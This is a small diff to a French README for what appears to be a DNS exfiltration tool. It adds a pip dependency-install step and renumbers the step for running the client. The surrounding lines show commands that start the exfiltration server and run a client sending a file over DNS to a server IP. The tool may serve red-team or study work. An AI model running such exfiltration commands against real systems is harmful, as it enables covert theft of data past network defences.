@@ -49,7 +49,13 @@ python3 dns_exfil_server.py -d domaine.com -p motdepasse --port 53535
 cd client
 ```
 
-### 2) Lancer le client
+### 2) Installer les dépendances
+
+```bash
+pip install -r requirements.txt
+```
+
+### 3) Lancer le client
 
 ```bash
 python dns_exfil_client.py <fichier> domaine.com motdepasse -s=<ip_serveur> -p=53535
